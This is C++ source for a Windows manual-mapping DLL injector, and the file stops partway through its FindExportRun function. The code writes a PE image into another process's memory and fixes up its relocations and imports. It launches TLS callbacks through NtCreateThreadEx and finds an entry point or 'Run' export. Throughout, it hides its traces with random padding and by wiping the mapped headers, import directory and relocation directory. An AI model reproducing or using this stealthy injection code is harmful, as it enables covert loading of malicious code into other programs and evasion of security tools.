#include "injector.h"
#include "utils.h"
#include <winternl.h>
#include <tlhelp32.h>
#include <sstream>
#include <vector>
#include <ktmw32.h>     
#include <string.h>            
#pragma comment(lib, "Ktmw32.lib")

struct MY_RTL_USER_PROCESS_PARAMETERS {
    ULONG MaximumLength;
    ULONG Length;
};

using NTQIP = NTSTATUS (NTAPI*)(
    HANDLE,                     // ProcessHandle
    PROCESSINFOCLASS,           // ProcessInformationClass
    PVOID,                      // ProcessInformation
    ULONG,                      // ProcessInformationLength
    PULONG                      // ReturnLength
);
static NTQIP pNtQueryInformationProcess =
    GetNt<NTQIP>("NtQueryInformationProcess");

using RTLINIT = VOID (NTAPI*)(PUNICODE_STRING, PCWSTR);
static RTLINIT pRtlInitUnicodeString =
    (RTLINIT)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"),
        "RtlInitUnicodeString"
    );

#ifndef NtCurrentProcess
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#endif

#ifndef PROCESS_CREATE_FLAGS_INHERIT_HANDLES
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
#endif

#ifndef SEC_NO_CHANGE
#define SEC_NO_CHANGE 0x00000040
#endif

#ifndef ViewUnmap
#define ViewUnmap 2
#endif

#ifndef RTL_USER_PROC_PARAMS_NORMALIZED
#define RTL_USER_PROC_PARAMS_NORMALIZED 0x00000001
#endif

#define LLOG(...) Log(__VA_ARGS__)

static bool SafeApplyRelocsDll(
    HANDLE    hp,
    BYTE*     local,
    BYTE*     remote,
    PIMAGE_NT_HEADERS nt);

static LPTHREAD_START_ROUTINE FindExportRun(
    BYTE* moduleBase,
    BYTE* remoteBase,
    PIMAGE_NT_HEADERS nt);

using NTWRITE = NTSTATUS (NTAPI*)(HANDLE,PVOID,const void*,SIZE_T,SIZE_T*);
auto NtWriteVM = GetNt<NTWRITE>("NtWriteVirtualMemory");
using NTREAD  = NTSTATUS (NTAPI*)(HANDLE,PVOID,void*,SIZE_T,SIZE_T*);
auto NtReadVM = GetNt<NTREAD>("NtReadVirtualMemory");
using NTPROTECT = NTSTATUS (NTAPI*)(HANDLE,PVOID*,SIZE_T*,ULONG,PULONG);
auto NtProtectVM = GetNt<NTPROTECT>("NtProtectVirtualMemory");
using NTFLUSH = NTSTATUS (NTAPI*)(HANDLE,const void*,SIZE_T);
auto NtFlushIC = GetNt<NTFLUSH>("NtFlushInstructionCache");
using NTRESUME = NTSTATUS (NTAPI*)(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
auto NtResumeThread = GetNt<NTRESUME>("NtResumeThread");
using RTLDESTROY = NTSTATUS (NTAPI*)(PRTL_USER_PROCESS_PARAMETERS ProcessParameters);
auto RtlDestroyProcessParameters =
    (RTLDESTROY)GetProcAddress(
        GetModuleHandleW(L"ntdll.dll"),
        "RtlDestroyProcessParameters"
    );

static bool ApplyRelocs(HANDLE hp,
                        BYTE*  local,
                        BYTE*  remote,
                        PIMAGE_NT_HEADERS nt)
{
    
    LLOG("[ENTER] ApplyRelocs(hp=%p, local=%p, remote=%p, ImageBase=0x%p)",
         hp, local, remote, (void*)nt->OptionalHeader.ImageBase);

    DWORD_PTR delta = (DWORD_PTR)remote - nt->OptionalHeader.ImageBase;
    LLOG("[DBG] ApplyRelocs: computed delta = 0x%p", (void*)delta);
    if (!delta) {
        LLOG("[DBG] ApplyRelocs: image already at preferred base");
        LLOG("[EXIT] ApplyRelocs: nothing to do");
        return true;
    }

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    LLOG("[DBG] ApplyRelocs: BaseReloc directory at RVA=0x%X, Size=%u",
         dir.VirtualAddress, dir.Size);
    if (dir.VirtualAddress == 0 ||
        dir.Size < sizeof(IMAGE_BASE_RELOCATION) ||
        dir.VirtualAddress + dir.Size > imageSize)
    {
        LLOG("[DBG] ApplyRelocs: no valid relocation directory");
        LLOG("[EXIT] ApplyRelocs: nothing to do");
        return true;
    }

    auto rvaToPtr = [&](DWORD rva) -> BYTE* {
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            DWORD va   = sec->VirtualAddress;
            DWORD sz   = max(sec->SizeOfRawData, sec->Misc.VirtualSize);
            DWORD ptr  = sec->PointerToRawData;
            if (rva >= va && rva < va + sz) {
                BYTE* p = local + ptr + (rva - va);
                LLOG("[TRACE] rvaToPtr: 0x%X → %p (sec %.8s)", rva, p, sec->Name);
                return p;
            }
        }
        LLOG("[ERROR] rvaToPtr: could not map RVA 0x%X", rva);
        return nullptr;
    };

    BYTE* base = rvaToPtr(dir.VirtualAddress);
    BYTE* end  = rvaToPtr(dir.VirtualAddress + dir.Size);
    if (!base || !end) {
        LLOG("[ERROR] ApplyRelocs: cannot map relocation directory to raw buffer");
        LLOG("[EXIT] ApplyRelocs: failure");
        return false;
    }
    LLOG("[DBG] ApplyRelocs: processing from %p to %p", base, end);

    BYTE* cur = base;
    DWORD totalPatched = 0;
    int blockIndex = 0;

    while (cur + sizeof(IMAGE_BASE_RELOCATION) <= end) {
        auto hdr = reinterpret_cast<PIMAGE_BASE_RELOCATION>(cur);
        DWORD blockSize = hdr->SizeOfBlock;
        DWORD rvaBlock  = hdr->VirtualAddress;
        LLOG("[DBG] Block #%d @%p: RVA=0x%X, SizeOfBlock=%u",
             blockIndex, cur, rvaBlock, blockSize);

        if (blockSize < sizeof(IMAGE_BASE_RELOCATION)) {
            LLOG("[WARN] Block #%d too small (%u), stopping", blockIndex, blockSize);
            break;
        }
        if (cur + blockSize > end) {
            LLOG("[WARN] Block #%d extends past end (cur+%u > %p), stopping",
                 blockIndex, blockSize, end);
            break;
        }

        WORD* entry = reinterpret_cast<WORD*>(hdr + 1);
        DWORD count = (blockSize - sizeof(*hdr)) / sizeof(WORD);
        LLOG("[DBG] Block #%d has %u entries", blockIndex, count);

        for (DWORD i = 0; i < count; ++i, ++entry) {
            WORD type   = *entry >> 12;
            WORD offset = *entry & 0x0FFF;
            BYTE* patchRaw = remote + rvaBlock + offset;
            LLOG("[TRACE] Block #%d entry %u: type=%u, offset=0x%X → patchAddr=%p",
                 blockIndex, i, type, offset, patchRaw);

#ifdef _WIN64
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG val = 0;
                NtReadVM(hp, patchRaw, &val, sizeof(val), nullptr);
                LLOG("[DBG]   before=0x%p", (void*)val);
                val += delta;
                NtWriteVM(hp, patchRaw, &val, sizeof(val), nullptr);
                LLOG("[DBG]   after =0x%p", (void*)val);
                ++totalPatched;
            }
#else
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD val = 0;
                NtReadVM(hp, patchRaw, &val, sizeof(val), nullptr);
                LLOG("[DBG]   before=0x%X", val);
                val += (DWORD)delta;
                NtWriteVM(hp, patchRaw, &val, sizeof(val), nullptr);
                LLOG("[DBG]   after =0x%X", val);
                ++totalPatched;
            }
#endif
        }

        cur += blockSize;
        ++blockIndex;
    }

    LLOG("[DBG] ApplyRelocs: total patched entries = %u", totalPatched);
    LLOG("[EXIT] ApplyRelocs: success");
    return true;
}

static bool BuildIAT(HANDLE hp,
                     BYTE*  local,
                     BYTE*  remote,
                     PIMAGE_NT_HEADERS nt)
{
    LLOG("[ENTER] BuildIAT(hp=%p, local=%p, remote=%p)", hp, local, remote);

    auto rvaToPtr = [&](DWORD rva)->BYTE* {
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            DWORD va   = sec->VirtualAddress;
            DWORD sz   = sec->SizeOfRawData;
            DWORD ptr  = sec->PointerToRawData;
            if (rva >= va && rva < va + sz) {
                return local + ptr + (rva - va);
            }
        }
        return nullptr;
    };

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    auto& dly = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];
    LLOG("[DBG] BuildIAT: Import RVA=0x%X Size=%u, DelayImport RVA=0x%X Size=%u",
         dir.VirtualAddress, dir.Size,
         dly.VirtualAddress, dly.Size);

    if (!dir.Size) {
        LLOG("[DBG] BuildIAT: no imports (dir.Size=0)");
        LLOG("[EXIT] BuildIAT: success");
        return true;
    }

    auto impDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
                       rvaToPtr(dir.VirtualAddress));
    if (!impDesc || !impDesc->Name) {
        LLOG("[DBG] BuildIAT: import directory empty or cannot map it");
        LLOG("[EXIT] BuildIAT: success");
        return true;
    }

    auto& iatDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];
    PVOID iatStart = nullptr;
    SIZE_T iatSize = 0;
    ULONG oldProt = 0;

    if (iatDir.VirtualAddress && iatDir.Size) {
        iatStart = remote + iatDir.VirtualAddress;
        iatSize  = iatDir.Size;
        LLOG("[DBG] BuildIAT: protecting full IAT at RVA=0x%X Size=%zu",
             iatDir.VirtualAddress, iatSize);
        NtProtectVM(hp, &iatStart, &iatSize, PAGE_READWRITE, &oldProt);
    } else {
        LLOG("[DBG] BuildIAT: no IAT DataDirectory, protecting per-FirstThunk pages");
        for (auto d = impDesc; d->Name; ++d) {
            DWORD thunkRVA = d->FirstThunk;
            BYTE* thunkAddr = remote + thunkRVA;
            uintptr_t page = (uintptr_t)thunkAddr & ~0xFFF;
            PVOID   pPage  = (PVOID)page;
            SIZE_T  szPage = 0x1000;
            NtProtectVM(hp, &pPage, &szPage, PAGE_READWRITE, &oldProt);
            LLOG("[DBG] BuildIAT: protected page %p for FirstThunk RVA=0x%X",
                 pPage, thunkRVA);
        }
    }

    DWORD totalThunks = 0;
    for (auto d = impDesc; d->Name; ++d) {
        BYTE* namePtr = rvaToPtr(d->Name);
        const char* dllName = namePtr
            ? reinterpret_cast<const char*>(namePtr)
            : "<invalid>";

        LLOG("[DBG] BuildIAT: resolving imports for %s", dllName);
        HMODULE hMod = LoadLibraryA(dllName);
        if (!hMod) {
            LLOG("[!] BuildIAT: LoadLibraryA(%s) failed", dllName);
            goto _fail;
        }

        DWORD thunkRVA = d->FirstThunk;
        auto thunkPtr = reinterpret_cast<PIMAGE_THUNK_DATA>(
                            rvaToPtr(thunkRVA));
        if (!thunkPtr) {
            LLOG("[!] BuildIAT: cannot map FirstThunk RVA=0x%X", thunkRVA);
            goto _fail;
        }

        for (DWORD idx = 0; thunkPtr[idx].u1.AddressOfData; ++idx) {
            FARPROC fn = nullptr;
            auto& cell = thunkPtr[idx].u1;
            if (cell.Ordinal & IMAGE_ORDINAL_FLAG) {
                DWORD ord = cell.Ordinal & 0xFFFF;
                fn = GetProcAddress(hMod, reinterpret_cast<LPCSTR>(ord));
            } else {
                BYTE* ibn = rvaToPtr(cell.AddressOfData);
                if (ibn) {
                    auto pin = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(ibn);
                    fn = GetProcAddress(hMod, pin->Name);
                }
            }
            if (!fn) {
                LLOG("[!] BuildIAT: %s!%zu not found", dllName, idx);
                goto _fail;
            }
            PVOID slot = remote + thunkRVA + idx * sizeof(void*);
            NtWriteVM(hp, slot, &fn, sizeof(fn), nullptr);
            ++totalThunks;
        }
    }

    // Delay load
    if (dly.Size) {
        LLOG("[DBG] BuildIAT: processing delay-load imports");
        auto del = reinterpret_cast<PIMAGE_DELAYLOAD_DESCRIPTOR>(
                       rvaToPtr(dly.VirtualAddress));
        while (del && del->DllNameRVA) {
            BYTE* nm = rvaToPtr(del->DllNameRVA);
            const char* dllName = nm
                ? reinterpret_cast<const char*>(nm)
                : "<invalid>";
            LLOG("[DBG] BuildIAT: delay-load %s", dllName);

            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) { LLOG("[!] DelayLoad LoadLibraryA(%s) failed", dllName); goto _fail; }

            DWORD iatRVA = del->ImportAddressTableRVA;
            auto thunkPtr = reinterpret_cast<PIMAGE_THUNK_DATA>(
                                rvaToPtr(iatRVA));
            for (DWORD idx = 0; thunkPtr && thunkPtr[idx].u1.AddressOfData; ++idx) {
                FARPROC fn;
                auto& cell = thunkPtr[idx].u1;
                if (cell.Ordinal & IMAGE_ORDINAL_FLAG) {
                    fn = GetProcAddress(hMod,
                           reinterpret_cast<LPCSTR>(cell.Ordinal & 0xFFFF));
                } else {
                    BYTE* ibn = rvaToPtr(cell.AddressOfData);
                    auto pin = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(ibn);
                    fn = GetProcAddress(hMod, pin->Name);
                }
                if (!fn) { LLOG("[!] DelayLoad %s!%zu not found", dllName, idx); goto _fail; }
                PVOID slot = remote + iatRVA + idx * sizeof(void*);
                NtWriteVM(hp, slot, &fn, sizeof(fn), nullptr);
                ++totalThunks;
            }
            ++del;
        }
    }

    if (iatStart && iatSize) {
        NtProtectVM(hp, &iatStart, &iatSize, oldProt, &oldProt);
    }
    LLOG("[DBG] BuildIAT: restored protection, total thunks fixed = %u", totalThunks);
    LLOG("[EXIT] BuildIAT: success");
    return true;

_fail:
    if (iatStart && iatSize) {
        NtProtectVM(hp, &iatStart, &iatSize, oldProt, &oldProt);
    }
    LLOG("[EXIT] BuildIAT: failure");
    return false;
}

static void CallTLS(
    HANDLE            hProc,
    BYTE*             localBase,
    BYTE*             remoteBase,
    PIMAGE_NT_HEADERS nt)
{
    LLOG("[ENTER] CallTLS(hProc=%p, localBase=%p, remoteBase=%p, ImageBase=0x%p)",
         hProc, localBase, remoteBase, (void*)nt->OptionalHeader.ImageBase);

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    LLOG("[DBG] TLS: directory RVA=0x%X, Size=%u", dir.VirtualAddress, dir.Size);

#if defined(_WIN64)
    constexpr SIZE_T MinTlsSize = sizeof(IMAGE_TLS_DIRECTORY64);
#else
    constexpr SIZE_T MinTlsSize = sizeof(IMAGE_TLS_DIRECTORY32);
#endif

    if (dir.Size < MinTlsSize) {
        LLOG("[DBG] TLS: none or too small");
        LLOG("[EXIT] CallTLS");
        return;
    }

#if defined(_WIN64)
    auto tlsLocal = reinterpret_cast<PIMAGE_TLS_DIRECTORY64>(
                        localBase + dir.VirtualAddress);
#else
    auto tlsLocal = reinterpret_cast<PIMAGE_TLS_DIRECTORY32>(
                        localBase + dir.VirtualAddress);
#endif

    LLOG("[DBG] TLS: AddressOfCallBacks = %p", (void*)tlsLocal->AddressOfCallBacks);
    if (!tlsLocal->AddressOfCallBacks) {
        LLOG("[DBG] TLS: directory present but empty");
        LLOG("[EXIT] CallTLS");
        return;
    }

    ULONGLONG imageBase = nt->OptionalHeader.ImageBase;
    ULONGLONG rvaArray  = tlsLocal->AddressOfCallBacks - imageBase;
    BYTE*     remoteArr = remoteBase + rvaArray;

    auto NtCrTE = GetNt<NTSTATUS (NTAPI*)(
        PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        HANDLE, PVOID, PVOID, ULONG,
        SIZE_T, SIZE_T, SIZE_T, PVOID)>(
            "NtCreateThreadEx");

    DWORD     count     = 0;
    ULONGLONG cbAddr    = 0;
    SIZE_T    bytesRead = 0;
    SIZE_T    offset    = 0;

    while (NT_SUCCESS(NtReadVM(
               hProc,
               remoteArr + offset,
               &cbAddr,
               sizeof(cbAddr),
               &bytesRead)) &&
           bytesRead  == sizeof(cbAddr) &&
           cbAddr     != 0)
    {
        LLOG("[DBG] TLS: queuing callback @%p", (void*)cbAddr);

        HANDLE hTh = nullptr;
        NtCrTE(&hTh,
               THREAD_ALL_ACCESS,
               nullptr,
               hProc,
               (PVOID)cbAddr,
               nullptr,
               FALSE,
               0,0,0,nullptr);
        if (hTh) {
            CloseHandle(hTh);
            ++count;
        }
        offset += sizeof(cbAddr);
    }

    LLOG("[DBG] TLS: %u callbacks queued", count);
    LLOG("[EXIT] CallTLS");
}

static BOOL ManualMapToProcess(
    HANDLE                     hProc,
    RemoteHeap&                rh,
    BYTE*                      module,
    DWORD                      size,
    /* out */ BYTE*&           remoteBase,
    /* out */ LPTHREAD_START_ROUTINE& ep,
    /* out */ std::string&     err
) {
    LLOG("[ENTER] ManualMapToProcess(hProc=%p, module=%p, size=%u)",
         hProc, module, size);

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        err = "DOS"; return FALSE;
    }
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        err = "NT"; return FALSE;
    }

    SIZE_T pad = (rand() & 0xFFF) + 0x1000;
    rh.alloc(pad);
    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    remoteBase = reinterpret_cast<BYTE*>(rh.alloc(imgSize));
    if (!remoteBase) { err = "alloc"; return FALSE; }

    SIZE_T hdrSize = nt->OptionalHeader.SizeOfHeaders;
    NtWriteVM(hProc, remoteBase, module, hdrSize, nullptr);

    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!sec->SizeOfRawData) continue;
        BYTE* dst = remoteBase + sec->VirtualAddress;
        BYTE* src = module    + sec->PointerToRawData;
        NtWriteVM(hProc, dst, src, sec->SizeOfRawData, nullptr);
        rh.protectRX(dst,
            sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData);
    }

    {
        std::vector<BYTE> zero(hdrSize);
        PVOID addr = remoteBase; ULONG old=0;
        NtProtectVM(hProc, &addr, &hdrSize, PAGE_READWRITE, &old);
        NtWriteVM(hProc, addr, zero.data(), hdrSize, nullptr);
        NtProtectVM(hProc, &addr, &hdrSize, old, &old);
    }

    if (!ApplyRelocs(hProc, module, remoteBase, nt)) {
        err = "reloc"; return FALSE;
    }

    if (!BuildIAT(hProc, module, remoteBase, nt)) {
        err = "IAT"; return FALSE;
    }

    {
        auto& imp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (imp.Size) {
            PVOID addr = remoteBase + imp.VirtualAddress; SIZE_T sz = imp.Size; ULONG old=0;
            NtProtectVM(hProc, &addr, &sz, PAGE_READWRITE, &old);
            std::vector<BYTE> z(sz);
            NtWriteVM(hProc, addr, z.data(), sz, nullptr);
            NtProtectVM(hProc, &addr, &sz, old, &old);
        }
        auto& rel = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rel.Size) {
            PVOID addr = remoteBase + rel.VirtualAddress; SIZE_T sz = rel.Size; ULONG old=0;
            NtProtectVM(hProc, &addr, &sz, PAGE_READWRITE, &old);
            std::vector<BYTE> z(sz);
            NtWriteVM(hProc, addr, z.data(), sz, nullptr);
            NtProtectVM(hProc, &addr, &sz, old, &old);
        }
    }

    CallTLS(hProc, module, remoteBase, nt);

    NtFlushIC(hProc, remoteBase, imgSize);

    ep = reinterpret_cast<LPTHREAD_START_ROUTINE>(
         remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
    LLOG("[DBG] ManualMap: entry point at %p", ep);

    LLOG("[EXIT] ManualMapToProcess: success");
    return TRUE;
}

static BOOL ManualMapDllToProcessSafe(
    HANDLE hProc,
    RemoteHeap& rh,
    BYTE* module,
    DWORD size,
    LPTHREAD_START_ROUTINE& ep,
    std::string& err)
{
    LLOG("[ENTER] ManualMapDllToProcessSafe(hProc=%p, module=%p, size=%u)",
         hProc, module, size);

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        LLOG("[ERROR] DOS header invalid (e_magic=0x%X)", dos->e_magic);
        err = "DOS";
        return FALSE;
    }
    auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        LLOG("[ERROR] NT header invalid (Signature=0x%X)", nt->Signature);
        err = "NT";
        return FALSE;
    }
    LLOG("[DBG] DOS/NT headers OK");

    SIZE_T pad = (rand() & 0xFFF) + 0x1000;
    rh.alloc(pad);
    SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
    LLOG("[DBG] Allocating %zu bytes in target process", imgSize);
    BYTE* remoteBase = reinterpret_cast<BYTE*>(rh.alloc(imgSize));
    if (!remoteBase) {
        LLOG("[ERROR] Remote alloc failed");
        err = "alloc";
        return FALSE;
    }
    LLOG("[DBG] remoteBase = %p", remoteBase);

    SIZE_T hdrSize = nt->OptionalHeader.SizeOfHeaders;
    LLOG("[DBG] Writing %zu bytes of headers to %p", hdrSize, remoteBase);
    NtWriteVM(hProc, remoteBase, module, hdrSize, nullptr);

    LLOG("[DBG] Mapping sections and setting RX");
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (!sec->SizeOfRawData) {
            LLOG("[DBG] Section %.8s has no raw data, skipping", sec->Name);
            continue;
        }
        BYTE* dst = remoteBase + sec->VirtualAddress;
        BYTE* src = module + sec->PointerToRawData;
        LLOG("[DBG] Section %.8s → RVA=0x%X, RawSize=%u → %p",
             sec->Name, sec->VirtualAddress, sec->SizeOfRawData, dst);
        NtWriteVM(hProc, dst, src, sec->SizeOfRawData, nullptr);
        rh.protectRX(dst,
            sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData);
    }

    {
        SIZE_T sizeHdr = nt->OptionalHeader.SizeOfHeaders;
        std::vector<BYTE> zeros(sizeHdr, 0);
        PVOID addr = remoteBase;
        ULONG oldProt = 0;
        NtProtectVM(hProc, &addr, &sizeHdr, PAGE_READWRITE, &oldProt);
        NtWriteVM(hProc, addr, zeros.data(), sizeHdr, nullptr);
        NtProtectVM(hProc, &addr, &sizeHdr, oldProt, &oldProt);
        LLOG("[DBG] PE-headers erased at %p (size=%zu)", remoteBase, nt->OptionalHeader.SizeOfHeaders);
    }

    LLOG("[DBG] Calling SafeApplyRelocsDll");
    if (!SafeApplyRelocsDll(hProc, module, remoteBase, nt)) {
        LLOG("[ERROR] SafeApplyRelocsDll failed");
        err = "SafeReloc";
        return FALSE;
    }
    LLOG("[DBG] SafeApplyRelocsDll succeeded");

    LLOG("[DBG] Calling BuildIAT");
    if (!BuildIAT(hProc, module, remoteBase, nt)) {
        LLOG("[ERROR] BuildIAT failed");
        err = "IAT";
        return FALSE;
    }
    LLOG("[DBG] BuildIAT succeeded");

    {
        auto& impDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (impDir.Size) {
            PVOID impAddr = remoteBase + impDir.VirtualAddress;
            SIZE_T szImp  = impDir.Size;
            ULONG oldProt = 0;
            NtProtectVM(hProc, &impAddr, &szImp, PAGE_READWRITE, &oldProt);
            std::vector<BYTE> z1(szImp, 0);
            NtWriteVM(hProc, impAddr, z1.data(), szImp, nullptr);
            NtProtectVM(hProc, &impAddr, &szImp, oldProt, &oldProt);
            LLOG("[DBG] IMPORT directory wiped (RVA=0x%X, Size=%u)",
                 impDir.VirtualAddress, impDir.Size);
        }
        // RELOC
        auto& relDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relDir.Size) {
            PVOID relAddr = remoteBase + relDir.VirtualAddress;
            SIZE_T szRel  = relDir.Size;
            ULONG oldProt = 0;
            NtProtectVM(hProc, &relAddr, &szRel, PAGE_READWRITE, &oldProt);
            std::vector<BYTE> z2(szRel, 0);
            NtWriteVM(hProc, relAddr, z2.data(), szRel, nullptr);
            NtProtectVM(hProc, &relAddr, &szRel, oldProt, &oldProt);
            LLOG("[DBG] RELOC directory wiped (RVA=0x%X, Size=%u)",
                 relDir.VirtualAddress, relDir.Size);
        }
    }

    // Run TLS callbacks
    LLOG("[DBG] Calling CallTLS");
    CallTLS(
    hProc,
    module,      
    remoteBase,
    nt
    );
    LLOG("[DBG] CallTLS done");

    // Flush instruction cache
    LLOG("[DBG] Flushing instruction cache");
    NtFlushIC(hProc, remoteBase, nt->OptionalHeader.SizeOfImage);

    // Compute entry point
    ep = reinterpret_cast<LPTHREAD_START_ROUTINE>(
         remoteBase + nt->OptionalHeader.AddressOfEntryPoint);
    LLOG("[EXIT] ManualMapDllToProcessSafe → ep=%p", ep);

    return TRUE;
}

static BOOL ManualMapDllToProcessWithRun(
    HANDLE hProc,
    RemoteHeap& rh,
    BYTE* module,
    DWORD size,
    LPTHREAD_START_ROUTINE& ep,
    std::string& err)
{
    LLOG("[ENTER] ManualMapDllToProcessWithRun(hProc=%p, module=%p, size=%u)",
         hProc, module, size);

    LLOG("[DBG] Calling ManualMapDllToProcessSafe");
    if (!ManualMapDllToProcessSafe(hProc, rh, module, size, ep, err)) {
        LLOG("[ERROR] ManualMapDllToProcessSafe failed: %s", err.c_str());
        return FALSE;
    }
    LLOG("[DBG] ManualMapDllToProcessSafe succeeded, ep=%p", ep);

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
    auto nt  = reinterpret_cast<PIMAGE_NT_HEADERS>(module + dos->e_lfanew);

    DWORD entryRva = nt->OptionalHeader.AddressOfEntryPoint;
    BYTE* remoteBase = reinterpret_cast<BYTE*>(
        reinterpret_cast<UINT_PTR>(ep) - entryRva
    );
    LLOG("[DBG] Computed remoteBase = %p (ep - EntryRva)", remoteBase);

    LLOG("[DBG] Calling FindExportRun");
    if (auto runAddr = FindExportRun(module, remoteBase, nt)) {
        ep = runAddr;
        LLOG("[DBG] Overriding EP → Run export at %p", ep);
    } else {
        LLOG("[DBG] Export \"Run\" not found, using original EP %p", ep);
    }

    LLOG("[EXIT] ManualMapDllToProcessWithRun → ep=%p", ep);
    return TRUE;
}

static bool SafeApplyRelocsDll(
    HANDLE    hp,
    BYTE*     local,
    BYTE*     remote,
    PIMAGE_NT_HEADERS nt)
{
    LLOG("[ENTER] SafeApplyRelocsDll(local=%p, remote=%p)", local, remote);

    auto& dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    if (dir.VirtualAddress == 0 ||
        dir.Size < sizeof(IMAGE_BASE_RELOCATION) ||
        dir.VirtualAddress + dir.Size > imageSize)
    {
        LLOG("[DBG] SafeApplyRelocsDll: no valid relocation directory");
        LLOG("[EXIT] SafeApplyRelocsDll (nothing to do)");
        return true;
    }

    auto rvaToPtr = [&](DWORD rva)->BYTE* {
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            DWORD va  = sec->VirtualAddress;
            DWORD sz  = max(sec->SizeOfRawData, sec->Misc.VirtualSize);
            DWORD ptr = sec->PointerToRawData;
            if (rva >= va && rva < va + sz) {
                return local + ptr + (rva - va);
            }
        }
        return nullptr;
    };

    BYTE* cur = rvaToPtr(dir.VirtualAddress);
    BYTE* end = rvaToPtr(dir.VirtualAddress + dir.Size);
    if (!cur || !end) {
        LLOG("[ERROR] SafeApplyRelocsDll: cannot map relocation directory");
        return false;
    }

    DWORD_PTR delta = (DWORD_PTR)remote - nt->OptionalHeader.ImageBase;
    LLOG("[DBG] SafeApplyRelocsDll: delta=0x%p, parsing %p…%p", (void*)delta, cur, end);

    int blockIndex = 0;
    while (cur + sizeof(IMAGE_BASE_RELOCATION) <= end)
    {
        auto hdr = reinterpret_cast<PIMAGE_BASE_RELOCATION>(cur);
        DWORD blockSize = hdr->SizeOfBlock;
        DWORD rva       = hdr->VirtualAddress;

        LLOG("[DBG] Block #%d at %p: RVA=0x%X, SizeOfBlock=%u",
             blockIndex, cur, rva, blockSize);

        if (blockSize < sizeof(IMAGE_BASE_RELOCATION) || cur + blockSize > end) {
            LLOG("[WARN] Block #%d invalid (SizeOfBlock=%u), stopping parse",
                 blockIndex, blockSize);
            break;
        }

        WORD* entry = reinterpret_cast<WORD*>(hdr + 1);
        DWORD count = (blockSize - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        LLOG("[DBG] Block #%d contains %u entries", blockIndex, count);

        for (DWORD i = 0; i < count; ++i, ++entry)
        {
            WORD type   = *entry >> 12;
            WORD offset = *entry & 0x0FFF;
            BYTE* addr  = remote + rva + offset;
            LLOG("[DBG] Entry %u: type=%u, offset=0x%X → addr=%p",
                 i, type, offset, addr);

#ifdef _WIN64
            if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG val = 0;
                NtReadVM(hp, addr, &val, sizeof(val), nullptr);
                val += delta;
                NtWriteVM(hp, addr, &val, sizeof(val), nullptr);
                LLOG("[DBG]   patched 64-bit: new value=0x%p", (void*)val);
            }
#else
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD val = 0;
                NtReadVM(hp, addr, &val, sizeof(val), nullptr);
                val += (DWORD)delta;
                NtWriteVM(hp, addr, &val, sizeof(val), nullptr);
                LLOG("[DBG]   patched 32-bit: new value=0x%X", val);
            }
#endif
        }

        cur += blockSize;
        ++blockIndex;
    }

    LLOG("[EXIT] SafeApplyRelocsDll (processed %d blocks)", blockIndex);
    return true;
}

static LPTHREAD_START_ROUTINE FindExportRun(
    BYTE* moduleBase,
    BYTE* remoteBase,
    PIMAGE_NT_HEADERS nt)
{
    LLOG("[ENTER] FindExportRun(moduleBase=%p, remoteBase=%p)", moduleBase, remoteBase);
    auto rvaToPtr = [&](DWORD rva)->BYTE* {
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
